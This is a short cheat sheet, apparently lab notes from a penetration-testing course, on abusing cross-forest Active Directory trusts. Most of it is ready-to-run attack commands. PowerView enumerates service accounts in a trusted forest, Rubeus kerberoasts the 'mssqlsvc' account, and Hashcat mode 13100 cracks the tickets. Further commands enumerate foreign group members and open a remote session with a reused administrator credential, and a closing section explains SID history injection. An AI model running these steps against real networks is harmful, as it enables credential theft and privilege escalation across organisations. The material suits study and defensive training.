# Attacking Domain Trusts - Cross-Forest Trust Abuse (Windows)

## Cross-Forest Kerberoasting

### Enumerate SPNs

```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

### Verify Account Privileges

```powershell
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
```

### Perform Kerberoasting

```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

### Crack Hashes

Use Hashcat mode 13100 on extracted tickets.

---

## Admin Password Reuse and Group Membership

### Enumerate Foreign Group Memberships

```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
```

### Verify Cross-Domain Access

```powershell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

---

## SID History Abuse (Cross-Forest)

### Concept

* Accounts migrated across forests may keep SID history.
* If SID filtering is disabled, an attacker can inject additional SIDs into `sidHistory`.
* The modified account inherits privileges of the injected SIDs.

